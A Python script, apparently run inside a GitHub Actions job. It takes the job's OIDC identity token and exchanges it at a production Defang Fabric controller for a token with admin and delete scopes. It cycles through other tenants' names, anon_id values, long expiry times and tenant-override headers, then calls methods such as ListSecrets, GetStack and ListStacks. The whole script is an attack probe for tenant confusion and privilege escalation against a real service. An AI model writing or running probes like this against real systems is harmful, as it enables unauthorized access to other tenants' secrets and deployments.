import os, json, base64, urllib.request, urllib.parse, urllib.error

FABRIC = "https://fabric-prod1.defang.dev/io.defang.v1.FabricController"

def get_token_raw(aud=None):
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    if aud:
        url += "&audience=" + urllib.parse.quote(aud, safe="")
    req = urllib.request.Request(url, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return 200, json.load(r)["value"]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]

def call(method, body, token=None, extra_headers=None):
    req = urllib.request.Request(FABRIC + "/" + method, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
    if token: req.add_header("Authorization", "Bearer " + token)
    for k, v in (extra_headers or {}).items(): req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, repr(e)

def claims(t):
    p = t.split(".")[1]; p += "=" * (-len(p) % 4)
    c = json.loads(base64.urlsafe_b64decode(p))
    ks = ["iss","sub","aud","ref","environment","repository","repository_owner","repository_owner_id","job_workflow_ref","event_name","workflow","actor"]
    return {k: c.get(k) for k in ks}

print("ENV job=", os.environ.get("JOBNAME"), "ref=", os.environ.get("GITHUB_REF"), "envclaim=", os.environ.get("ENVNAME"))
print("repo visibility assumed:", os.environ.get("VIS"))
# audience failure bodies
for aud in ["https://github.com/DefangLabs", "https://github.com/defanglabs", "https://github.com/DefangLabs/defang", "https://github.com/defangdevs", "sts.amazonaws.com", "https://defang.io"]:
    st, v = get_token_raw(aud)
    print("AUDTEST %r -> %s %s" % (aud, st, "" if st == 200 else v), flush=True)
    if st == 200:
        print("  claims=", json.dumps(claims(v)), flush=True)

st, t = get_token_raw(None)
print("DEFAULT AUD token status", st, "len", len(t) if st == 200 else "-", flush=True)
if st != 200:
    raise SystemExit(0)
print("claims=", json.dumps(claims(t)), flush=True)

def exchange(body, label):
    st, resp = call("Token", body)
    print("%s -> HTTP %s %s" % (label, st, resp[:400]), flush=True)
    try: return json.loads(resp).get("accessToken")
    except Exception: return None

base = {"assertion": t, "scope": ["admin","read","delete","tail"]}
at = exchange(dict(base), "no-tenant")
for ten in ["defangdevs", "DefangLabs", "playground", "tl0r2tahpam2g", "cballk"]:
    exchange({**base, "tenant": ten}, "tenant="+ten)
for anon in ["defangdevs", "00000000-0000-0000-0000-000000000000", os.environ.get("GITHUB_REPOSITORY_OWNER","")]:
    exchange({**base, "anon_id": anon}, "anon_id="+anon)
exchange({**base, "expires_in": 2591999}, "expires_in=2591999")
exchange({**base, "expires_in": 3600}, "expires_in=3600")
exchange({"assertion": t, "scope": []}, "empty-scope")

if at:
    p = at.split(".")[1]; p += "=" * (-len(p) % 4)
    fc = json.loads(base64.urlsafe_b64decode(p))
    print("FABRIC-CLAIMS", json.dumps(fc), flush=True)
    print("FABRIC-EXP-HOURS %.2f" % ((fc.get("exp",0)-__import__("time").time())/3600), flush=True)
    probes = [
        ("WhoAmI", {}), ("ListStacks", {}), ("ListDeployments", {}),
        ("GetDelegateSubdomainZone", {}),
        ("GetStack", {"project":"agent-box"}),
        ("ListSecrets", {"project":"agent-box"}),
        ("GetDeployment", {"id":"00000000-0000-0000-0000-000000000000"}),
        ("GetServices", {"project":"agent-box"}),
    ]
    for m, b in probes:
        st2, r2 = call(m, b, at)
        print("M %s -> %s %s" % (m, st2, r2[:400]), flush=True)
    for h in [{"X-Defang-Tenant-Id":"defangdevs"}, {"Defang-Tenant-Id":"defangdevs"}, {"X-Defang-Tenant":"defangdevs"}]:
        st2, r2 = call("ListStacks", {}, at, h)
        print("HDR %s -> %s %s" % (list(h.values())[0], st2, r2[:300]), flush=True)
print("DONE2")
